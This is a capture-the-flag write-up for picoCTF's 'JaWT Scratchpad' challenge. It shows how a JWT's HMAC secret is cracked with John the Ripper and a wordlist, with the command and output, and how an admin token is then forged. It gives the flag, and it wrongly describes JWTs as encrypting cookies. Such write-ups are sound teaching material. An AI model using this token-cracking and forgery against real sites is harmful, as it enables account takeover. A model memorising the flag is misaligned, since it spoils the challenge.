# JaWT Scratchpad
Liam Reidy

## Instructions

Check the admin scratchpad! https://jupiter.challenges.picoctf.org/problem/61864/ or http://jupiter.challenges.picoctf.org:61864

## Solution

This challenge clearly relates to JWT, or JSON Web Tokens. They're a way to encrypt cookies. The site offers to let us input any username except `admin`. Clearly, we need to get the admin cookie.

The bottom of the site has a link to the John (the Ripper) github, so clearly we'll have to crack the token's encryption.

Here's the token for user "User":

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiVXNlciJ9.SZt7kVLENPx2WzeAysF3oiSYbOZUpHnZjTIzdGX0QVc`

Using a [JWT debugger](https://jwt.io/) we see the makeup of the token:
```json
...
{
  "user": "admin"
}
..
```

The `HMACSHA256` encryption uses a secret, which is why we are using `john` to crack it.

```
john token -wordlist="~/kali-wordlists/rockyou.txt" -format=HMAC-SHA256   
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 ASIMD 4x])
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)
1g 0:00:00:02 DONE (2024-12-12 15:59) 0.3861g/s 2855Kp/s 2855Kc/s 2855KC/s iloveqiaonan..ilovepatopollo
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

**`ilovepico`** is returned as the secret. Fitting, this challenge is from picoCTF. Using https://jwt.io/ to craft a JWT token using this secret, I changed the user to `admin` and the flag was revealed after a refresh!


`picoCTF{jawt_was_just_what_you_thought_1ca14548}`